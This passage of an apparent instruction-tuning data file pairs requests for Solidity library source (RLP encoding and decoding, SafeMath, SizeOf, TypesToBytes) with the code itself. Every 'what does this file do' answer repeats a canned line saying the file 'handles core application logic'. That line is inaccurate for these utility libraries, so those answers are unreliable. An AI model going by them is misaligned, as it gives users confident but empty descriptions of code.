item.memPtr + item.len;\n        while (currPtr < endPtr) {\n            currPtr = currPtr + _itemLength(currPtr); // skip over an item\n            ++count;\n        }\n\n        return count;\n    }\n\n    function _itemLength(uint256 memPtr) private pure returns (uint256) {\n        uint256 itemLen;\n        uint256 byte0;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < STRING_SHORT_START) {\n            itemLen = 1;\n        } else if (byte0 < STRING_LONG_START) {\n            itemLen = byte0 - STRING_SHORT_START + 1;\n        } else if (byte0 < LIST_SHORT_START) {\n            uint256 dataLen;\n            assembly {\n                let byteLen := sub(byte0, 0xb7) // # of bytes the actual length is\n                memPtr := add(memPtr, 1) // skip over the first byte\n\n                /* 32 byte word size */\n                dataLen := div(mload(memPtr), exp(256, sub(32, byteLen))) // right shifting to get the len\n                itemLen := add(dataLen, add(byteLen, 1))\n            }\n            require(itemLen >= dataLen, \"addition overflow\");\n        } else if (byte0 < LIST_LONG_START) {\n            itemLen = byte0 - LIST_SHORT_START + 1;\n        } else {\n            uint256 dataLen;\n            assembly {\n                let byteLen := sub(byte0, 0xf7)\n                memPtr := add(memPtr, 1)\n\n                dataLen := div(mload(memPtr), exp(256, sub(32, byteLen))) // right shifting to the correct length\n                itemLen := add(dataLen, add(byteLen, 1))\n            }\n            require(itemLen >= dataLen, \"addition overflow\");\n        }\n\n        return itemLen;\n    }\n\n    // @return number of bytes until the data\n    function _payloadOffset(uint256 memPtr) private pure returns (uint256) {\n        uint256 byte0;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < STRING_SHORT_START) {\n            return 0;\n        } else if (byte0 < STRING_LONG_START || (byte0 >= LIST_SHORT_START && byte0 < LIST_LONG_START)) {\n            return 1;\n        } else if (\n            byte0 < LIST_SHORT_START // being explicit\n        ) {\n            return byte0 - (STRING_LONG_START - 1) + 1;\n        } else {\n            return byte0 - (LIST_LONG_START - 1) + 1;\n        }\n    }\n\n    /*\n    * @param src Pointer to source\n    * @param dest Pointer to destination\n    * @param len Amount of memory to copy from the source\n    */\n    function copy(uint256 src, uint256 dest, uint256 len) private pure {\n        if (len == 0) return;\n\n        // copy as many word sizes as possible\n        for (; len >= WORD_SIZE; len -= WORD_SIZE) {\n            assembly {\n                mstore(dest, mload(src))\n            }\n\n            src += WORD_SIZE;\n            dest += WORD_SIZE;\n        }\n\n        // left over bytes. Mask is used to remove unwanted bytes from the word\n        uint256 mask = 256 ** (WORD_SIZE - len) - 1;\n        assembly {\n            let srcpart := and(mload(src), not(mask)) // zero out src\n            let destpart := and(mload(dest), mask) // retrieve the bytes\n            mstore(dest, or(destpart, srcpart))\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file RLPDecode.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nlibrary RLPDecode {\n    uint8 constant STRING_SHORT_START = 0x80;\n    uint8 constant STRING_LONG_START = 0xb8;\n    uint8 constant LIST_SHORT_START = 0xc0;\n    uint8 constant LIST_LONG_START = 0xf8;\n\n    uint8 constant WORD_SIZE = 32;\n\n    struct RLPItem {\n        uint256 len;\n        uint256 memPtr;\n    }\n\n    struct Iterator {\n        RLPItem item; // Item that's being iterated over.\n        uint256 nextPtr; // Position of the next item in the list.\n    }\n\n    function next(Iterator memory self) internal pure returns (RLPItem memory) {\n        require(hasNext(self));\n\n        uint256 ptr = self.nextPtr;\n        uint256 itemLength = _itemLength(ptr);\n        self.nextPtr = ptr + itemLength;\n\n        return RLPItem(itemLength, ptr);\n    }\n\n    function hasNext(Iterator memory self) internal pure returns (bool) {\n        RLPItem memory item = self.item;\n        return self.nextPtr < item.memPtr + item.len;\n    }\n\n    function toRLPItem(bytes memory self) internal pure returns (RLPItem memory) {\n        uint256 memPtr;\n        assembly {\n            memPtr := add(self, 0x20)\n        }\n\n        return RLPItem(self.length, memPtr);\n    }\n\n    function iterator(RLPItem memory self) internal pure returns (Iterator memory) {\n        require(isList(self));\n\n        uint256 ptr = self.memPtr + _payloadOffset(self.memPtr);\n        return Iterator(self, ptr);\n    }\n\n    function rlpLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len;\n    }\n\n    function payloadLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len - _payloadOffset(item.memPtr);\n    }\n\n    function toList(RLPItem memory item) internal pure returns (RLPItem[] memory) {\n        require(isList(item));\n\n        uint256 items = numItems(item);\n        RLPItem[] memory result = new RLPItem[](items);\n\n        uint256 memPtr = item.memPtr + _payloadOffset(item.memPtr);\n        uint256 dataLen;\n        for (uint256 i = 0; i < items; ++i) {\n```", "output": "This file `RLPDecode.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for RLPEncode.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\RLPEncode.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nlibrary RLPEncode {\n    uint8 constant STRING_OFFSET = 0x80;\n    uint8 constant LIST_OFFSET = 0xc0;\n\n    /**\n     * @notice Encode string item\n     * @param self The string (ie. byte array) item to encode\n     * @return The RLP encoded string in bytes\n     */\n    function encodeBytes(bytes memory self) internal pure returns (bytes memory) {\n        if (self.length == 1 && self[0] <= 0x7f) {\n            return self;\n        }\n        return mergeBytes(encodeLength(self.length, STRING_OFFSET), self);\n    }\n\n    /**\n     * @notice Encode address\n     * @param self The address to encode\n     * @return The RLP encoded address in bytes\n     */\n    function encodeAddress(address self) internal pure returns (bytes memory) {\n        bytes memory b;\n        assembly {\n            let m := mload(0x40)\n            mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, self))\n            mstore(0x40, add(m, 52))\n            b := m\n        }\n        return encodeBytes(b);\n    }\n\n    /**\n     * @notice Encode uint\n     * @param self The uint to encode\n     * @return The RLP encoded uint in bytes\n     */\n    function encodeUint(uint256 self) internal pure returns (bytes memory) {\n        return encodeBytes(toBinary(self));\n    }\n\n    /**\n     * @notice Encode int\n     * @param self The int to encode\n     * @return The RLP encoded int in bytes\n     */\n    function encodeInt(int256 self) internal pure returns (bytes memory) {\n        return encodeUint(uint256(self));\n    }\n\n    /**\n     * @notice Encode bool\n     * @param self The bool to encode\n     * @return The RLP encoded bool in bytes\n     */\n    function encodeBool(bool self) internal pure returns (bytes memory) {\n        bytes memory rs = new bytes(1);\n        rs[0] = (self ? bytes1(0x01) : bytes1(0x80));\n        return rs;\n    }\n\n    /**\n     * @notice Encode list of items\n     * @param self The list of items to encode, each item in list must be already encoded\n     * @return The RLP encoded list of items in bytes\n     */\n    function encodeList(bytes[] memory self) internal pure returns (bytes memory) {\n        if (self.length == 0) {\n            return new bytes(0);\n        }\n        bytes memory payload = self[0];\n        for (uint256 i = 1; i < self.length; ++i) {\n            payload = mergeBytes(payload, self[i]);\n        }\n        return mergeBytes(encodeLength(payload.length, LIST_OFFSET), payload);\n    }\n\n    /**\n     * @notice Concat two bytes arrays\n     * @param _preBytes The first bytes array\n     * @param _postBytes The second bytes array\n     * @return The merged bytes array\n     */\n    function mergeBytes(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bytes memory) {\n        bytes memory tempBytes;\n\n        assembly {\n            // Get a location of some free memory and store it in tempBytes as\n            // Solidity does for memory variables.\n            tempBytes := mload(0x40)\n\n            // Store the length of the first bytes array at the beginning of\n            // the memory for tempBytes.\n            let length := mload(_preBytes)\n            mstore(tempBytes, length)\n\n            // Maintain a memory counter for the current write location in the\n            // temp bytes array by adding the 32 bytes for the array length to\n            // the starting location.\n            let mc := add(tempBytes, 0x20)\n            // Stop copying when the memory counter reaches the length of the\n            // first bytes array.\n            let end := add(mc, length)\n\n            for {\n                // Initialize a copy counter to the start of the _preBytes data,\n                // 32 bytes into its memory.\n                let cc := add(_preBytes, 0x20)\n            } lt(mc, end) {\n                // Increase both counters by 32 bytes each iteration.\n                mc := add(mc, 0x20)\n                cc := add(cc, 0x20)\n            } {\n                // Write the _preBytes data into the tempBytes memory 32 bytes\n                // at a time.\n                mstore(mc, mload(cc))\n            }\n\n            // Add the length of _postBytes to the current length of tempBytes\n            // and store it as the new length in the first 32 bytes of the\n            // tempBytes memory.\n            length := mload(_postBytes)\n            mstore(tempBytes, add(length, mload(tempBytes)))\n\n            // Move the memory counter back from a multiple of 0x20 to the\n            // actual end of the _preBytes data.\n            mc := end\n            // Stop copying when the memory counter reaches the new combined\n            // length of the arrays.\n            end := add(mc, length)\n\n            for { let cc := add(_postBytes, 0x20) } lt(mc, end) {\n                mc := add(mc, 0x20)\n                cc := add(cc, 0x20)\n            } { mstore(mc, mload(cc)) }\n\n            // Update the free-memory pointer by padding our last write location\n            // to 32 bytes: add 31 bytes to the end of tempBytes to move to the\n            // next 32 byte block, then round down to the nearest multiple of\n            // 32. If the sum of the length of the two arrays is zero then add\n            // one before rounding down to leave a blank 32 bytes (the length block with 0).\n            mstore(\n                0x40,\n                and(\n                    add(add(end, iszero(add(length, mload(_preBytes)))), 31),\n                    not(31) // Round down to the nearest 32 bytes.\n                )\n            )\n        }\n\n        return tempBytes;\n    }\n\n    /**\n     * @notice Encode the first byte, followed by the `length` in binary form if `length` is more than 55.\n     * @param length The length of the string or the payload\n     * @param offset `STRING_OFFSET` if item is string, `LIST_OFFSET` if item is list\n     * @return RLP encoded bytes\n     */\n    function encodeLength(uint256 length, uint256 offset) internal pure returns (bytes memory) {\n        require(length < 256 ** 8, \"input too long\");\n        bytes memory rs = new bytes(1);\n        if (length <= 55) {\n            rs[0] = bytes1(uint8(length + offset));\n            return rs;\n        }\n        bytes memory bl = toBinary(length);\n        rs[0] = bytes1(uint8(bl.length + offset + 55));\n        return mergeBytes(rs, bl);\n    }\n\n    /**\n     * @notice Encode integer in big endian binary form with no leading zeroes\n     * @param x The integer to encode\n     * @return RLP encoded bytes\n     */\n    function toBinary(uint256 x) internal pure returns (bytes memory) {\n        bytes memory b = new bytes(32);\n        assembly {\n            mstore(add(b, 32), x)\n        }\n        uint256 i;\n        if (x & 0xffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000 == 0) {\n            i = 24;\n        } else if (x & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 == 0) {\n            i = 16;\n        } else {\n            i = 0;\n        }\n        for (; i < 32; ++i) {\n            if (b[i] != 0) {\n                break;\n            }\n        }\n        uint256 length = 32 - i;\n        bytes memory rs = new bytes(length);\n        assembly {\n            mstore(add(rs, length), x)\n            mstore(rs, length)\n        }\n        return rs;\n    }\n}\n\n```"}
{"instruction": "What does the file RLPEncode.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nlibrary RLPEncode {\n    uint8 constant STRING_OFFSET = 0x80;\n    uint8 constant LIST_OFFSET = 0xc0;\n\n    /**\n     * @notice Encode string item\n     * @param self The string (ie. byte array) item to encode\n     * @return The RLP encoded string in bytes\n     */\n    function encodeBytes(bytes memory self) internal pure returns (bytes memory) {\n        if (self.length == 1 && self[0] <= 0x7f) {\n            return self;\n        }\n        return mergeBytes(encodeLength(self.length, STRING_OFFSET), self);\n    }\n\n    /**\n     * @notice Encode address\n     * @param self The address to encode\n     * @return The RLP encoded address in bytes\n     */\n    function encodeAddress(address self) internal pure returns (bytes memory) {\n        bytes memory b;\n        assembly {\n            let m := mload(0x40)\n            mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, self))\n            mstore(0x40, add(m, 52))\n            b := m\n        }\n        return encodeBytes(b);\n    }\n\n    /**\n     * @notice Encode uint\n     * @param self The uint to encode\n     * @return The RLP encoded uint in bytes\n     */\n    function encodeUint(uint256 self) internal pure returns (bytes memory) {\n        return encodeBytes(toBinary(self));\n    }\n\n    /**\n     * @notice Encode int\n     * @param self The int to encode\n     * @return The RLP encoded int in bytes\n     */\n    function encodeInt(int256 self) internal pure returns (bytes memory) {\n        return encodeUint(uint256(self));\n    }\n\n    /**\n     * @notice Encode bool\n     * @param self The bool to encode\n     * @return The RLP encoded bool in bytes\n     */\n    function encodeBool(bool self) internal pure returns (bytes memory) {\n        bytes memory rs = new bytes(1);\n        rs[0] = (self ? bytes1(0x01) : bytes1(0x80));\n        return rs;\n    }\n\n    /**\n     * @notice Encode list of items\n     * @param self The list of items to encode, each item in list must be already encoded\n     * @return The RLP enco\n```", "output": "This file `RLPEncode.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SafeMath.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\SafeMath.sol`:\n\n```sol\npragma solidity 0.6.4;\n\n/**\n * Copyright (c) 2016-2019 zOS Global Limited\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\n```"}
{"instruction": "What does the file SafeMath.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\n/**\n * Copyright (c) 2016-2019 zOS Global Limited\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, r\n```", "output": "This file `SafeMath.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SizeOf.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\SizeOf.sol`:\n\n```sol\npragma solidity 0.6.4;\n\n/**\n * @title SizeOf\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev The SizeOf return the size of the solidity types in byte\n * @author pouladzade@gmail.com\n */\nlibrary SizeOf {\n    function sizeOfString(string memory _in) internal pure returns (uint256 _size) {\n        _size = bytes(_in).length / 32;\n        if (bytes(_in).length % 32 != 0) {\n            ++_size;\n        }\n\n        ++_size; // first 32 bytes is reserved for the size of the string\n        _size *= 32;\n    }\n\n    function sizeOfInt(uint16 _postfix) internal pure returns (uint256 size) {\n        assembly {\n            switch _postfix\n            case 8 { size := 1 }\n            case 16 { size := 2 }\n            case 24 { size := 3 }\n            case 32 { size := 4 }\n            case 40 { size := 5 }\n            case 48 { size := 6 }\n            case 56 { size := 7 }\n            case 64 { size := 8 }\n            case 72 { size := 9 }\n            case 80 { size := 10 }\n            case 88 { size := 11 }\n            case 96 { size := 12 }\n            case 104 { size := 13 }\n            case 112 { size := 14 }\n            case 120 { size := 15 }\n            case 128 { size := 16 }\n            case 136 { size := 17 }\n            case 144 { size := 18 }\n            case 152 { size := 19 }\n            case 160 { size := 20 }\n            case 168 { size := 21 }\n            case 176 { size := 22 }\n            case 184 { size := 23 }\n            case 192 { size := 24 }\n            case 200 { size := 25 }\n            case 208 { size := 26 }\n            case 216 { size := 27 }\n            case 224 { size := 28 }\n            case 232 { size := 29 }\n            case 240 { size := 30 }\n            case 248 { size := 31 }\n            case 256 { size := 32 }\n            default { size := 32 }\n        }\n    }\n\n    function sizeOfUint(uint16 _postfix) internal pure returns (uint256 size) {\n        return sizeOfInt(_postfix);\n    }\n\n    function sizeOfAddress() internal pure returns (uint8) {\n        return 20;\n    }\n\n    function sizeOfBool() internal pure returns (uint8) {\n        return 1;\n    }\n}\n\n```"}
{"instruction": "What does the file SizeOf.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\n/**\n * @title SizeOf\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev The SizeOf return the size of the solidity types in byte\n * @author pouladzade@gmail.com\n */\nlibrary SizeOf {\n    function sizeOfString(string memory _in) internal pure returns (uint256 _size) {\n        _size = bytes(_in).length / 32;\n        if (bytes(_in).length % 32 != 0) {\n            ++_size;\n        }\n\n        ++_size; // first 32 bytes is reserved for the size of the string\n        _size *= 32;\n    }\n\n    function sizeOfInt(uint16 _postfix) internal pure returns (uint256 size) {\n        assembly {\n            switch _postfix\n            case 8 { size := 1 }\n            case 16 { size := 2 }\n            case 24 { size := 3 }\n            case 32 { size := 4 }\n            case 40 { size := 5 }\n            case 48 { size := 6 }\n            case 56 { size := 7 }\n            case 64 { size := 8 }\n            case 72 { size := 9 }\n            case 80 { size := 10 }\n            case 88 { size := 11 }\n            case 96 { size := 12 }\n            case 104 { size := 13 }\n            case 112 { size := 14 }\n            case 120 { size := 15 }\n            case 128 { size := 16 }\n            case 136 { size := 17 }\n            case 144 { size := 18 }\n            case 152 { size := 19 }\n            case 160 { size := 20 }\n            case 168 { size := 21 }\n            case 176 { size := 22 }\n            case 184 { size := 23 }\n            case 192 { size := 24 }\n            case 200 { size := 25 }\n            case 208 { size := 26 }\n            case 216 { size := 27 }\n            case 224 { size := 28 }\n            case 232 { size := 29 }\n            case 240 { size := 30 }\n            case 248 { size := 31 }\n            case 256 { size := 32 }\n            default { size := 32 }\n        }\n    }\n\n    function sizeOfUint(uint16 _postfix) internal pure returns (uint256 size) {\n        return sizeOfInt(_postfix);\n    }\n\n    function sizeOfAddress() internal pure returns (uin\n```", "output": "This file `SizeOf.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for TypesToBytes.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\TypesToBytes.sol`:\n\n```sol\npragma solidity 0.6.4;\n\n/**\n * @title TypesToBytes\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev The TypesToBytes contract converts the standard solidity types to the byte array\n * @author pouladzade@gmail.com\n */\nlibrary TypesToBytes {\n    function addressToBytes(uint256 _offst, address _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n        }\n    }\n\n    function bytes32ToBytes(uint256 _offst, bytes32 _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n            mstore(add(add(_output, _offst), 32), add(_input, 32))\n        }\n    }\n\n    function boolToBytes(uint256 _offst, bool _input, bytes memory _output) internal pure {\n        uint8 x = _input == false ? 0 : 1;\n        assembly {\n            mstore(add(_output, _offst), x)\n        }\n    }\n\n    function stringToBytes(uint256 _offst, bytes memory _input, bytes memory _output) internal pure {\n        uint256 stack_size = _input.length / 32;\n        if (_input.length % 32 > 0) ++stack_size;\n\n        assembly {\n            stack_size := add(stack_size, 1) //adding because of 32 first bytes memory as the length\n            for { let index := 0 } lt(index, stack_size) { index := add(index, 1) } {\n                mstore(add(_output, _offst), mload(add(_input, mul(index, 32))))\n                _offst := sub(_offst, 32)\n            }\n        }\n    }\n\n    function intToBytes(uint256 _offst, int256 _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n        }\n    }\n\n    function uintToBytes(uint256 _offst, uint256 _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file TypesToBytes.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\n/**\n * @title TypesToBytes\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev The TypesToBytes contract converts the standard solidity types to the byte array\n * @author pouladzade@gmail.com\n */\nlibrary TypesToBytes {\n    function addressToBytes(uint256 _offst, address _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n        }\n    }\n\n    function bytes32ToBytes(uint256 _offst, bytes32 _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n            mstore(add(add(_output, _offst), 32), add(_input, 32))\n        }\n    }\n\n    function boolToBytes(uint256 _offst, bool _input, bytes memory _output) internal pure {\n        uint8 x = _input == false ? 0 : 1;\n        assembly {\n            mstore(add(_output, _offst), x)\n        }\n    }\n\n    function stringToBytes(uint256 _offst, bytes memory _input, bytes memory _output) internal pure {\n        uint256 stack_size = _input.length / 32;\n        if (_input.length % 32 > 0) ++stack_size;\n\n        assembly {\n            stack_size := add(stack_size, 1) //adding because of 32 first bytes memory as the length\n            for { let index := 0 } lt(index, stack_size) { index := add(index, 1) } {\n                mstore(add(_output, _offst), mload(add(_input, mul(index, 32))))\n                _offst := sub(_offst, 32)\n            }\n        }\n    }\n\n    function intToBytes(uint256 _offst, int256 _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n        }\n    }\n\n    function uintToBytes(uint256 _offst, uint256 _input, bytes memory _output) internal pure {\n        assembly {\n            mstore(add(_output, _offst), _input)\n        }\n    }\n}\n\n```", "output": "This file `TypesToBytes.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for RLPDecode.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.8.x\\RLPDecode.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\n\n/**\n * @dev This library provides a RLP decoder.\n * This lib is copied from `contracts/lib/RLPDecode.sol`. Some necessary modifications are made to make it compatible with solidity 0.8.17.\n * And we also applied this lib in greenfield(https://github.com/bnb-chain/greenfield) project.\n * This is unnecessary to be audited again.\n */\npragma solidity 0.8.17;\n\nlibrary RLPDecode {\n    uint8 constant STRING_SHORT_START = 0x80;\n    uint8 constant STRING_LONG_START = 0xb8;\n    uint8 constant LIST_SHORT_START = 0xc0;\n    uint8 constant LIST_LONG_START = 0xf8;\n\n    uint8 constant WORD_SIZE = 32;\n\n    struct RLPItem {\n        uint256 len;\n        uint256 memPtr;\n    }\n\n    struct Iterator {\n        RLPItem item; // Item that's being iterated over.\n        uint256 nextPtr; // Position of the next item in the list.\n    }\n\n    function next(Iterator memory self) internal pure returns (RLPItem memory) {\n        require(hasNext(self));\n\n        uint256 ptr = self.nextPtr;\n        uint256 itemLength = _itemLength(ptr);\n        self.nextPtr = ptr + itemLength;\n\n        return RLPItem(itemLength, ptr);\n    }\n\n    function hasNext(Iterator memory self) internal pure returns (bool) {\n        RLPItem memory item = self.item;\n        return self.nextPtr < item.memPtr + item.len;\n    }\n\n    function toRLPItem(bytes memory self) internal pure returns (RLPItem memory) {\n        uint256 memPtr;\n        assembly {\n            memPtr := add(self, 0x20)\n        }\n\n        return RLPItem(self.length, memPtr);\n    }\n\n    function iterator(RLPItem memory self) internal pure returns (Iterator memory) {\n        require(isList(self));\n\n        uint256 ptr = self.memPtr + _payloadOffset(self.memPtr);\n        return Iterator(self, ptr);\n    }\n\n    function rlpLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len;\n    }\n\n    function payloadLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len - _payloadOffset(item.memPtr);\n    }\n\n    function toList(RLPItem memory item) internal pure returns (RLPItem[] memory) {\n        require(isList(item));\n\n        uint256 items = numItems(item);\n        RLPItem[] memory result = new RLPItem[](items);\n\n        uint256 memPtr = item.memPtr + _payloadOffset(item.memPtr);\n        uint256 dataLen;\n        for (uint256 i = 0; i < items; ++i) {\n            dataLen = _itemLength(memPtr);\n            result[i] = RLPItem(dataLen, memPtr);\n            memPtr = memPtr + dataLen;\n        }\n\n        return result;\n    }\n\n    function isList(RLPItem memory item) internal pure returns (bool) {\n        if (item.len == 0) return false;\n\n        uint8 byte0;\n        uint256 memPtr = item.memPtr;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < LIST_SHORT_START) {\n            return false;\n        }\n        return true;\n    }\n\n    function toRlpBytes(RLPItem memory item) internal pure returns (bytes memory) {\n        bytes memory result = new bytes(item.len);\n        if (result.length == 0) return result;\n\n        uint256 ptr;\n        assembly {\n            ptr := add(0x20, result)\n        }\n\n        copy(item.memPtr, ptr, item.len);\n        return result;\n    }\n\n    function toBoolean(RLPItem memory item) internal pure returns (bool) {\n        require(item.len == 1);\n        uint256 result;\n        uint256 memPtr = item.memPtr;\n        assembly {\n            result := byte(0, mload(memPtr))\n        }\n\n        if (result == 0 || result == STRING_SHORT_START) {\n            return false;\n        } else {\n            return true;\n        }\n    }\n\n    function toAddress(RLPItem memory item) internal pure returns (address) {\n        // 1 byte for the length prefix\n        require(item.len == 21);\n\n        return address(uint160(toUint(item)));\n    }\n\n    function toUint(RLPItem memory item) internal pure returns (uint256) {\n        require(item.len > 0 && item.len <= 33);\n\n        uint256 offset = _payloadOffset(item.memPtr);\n        require(item.len >= offset, \"length is less than offset\");\n        uint256 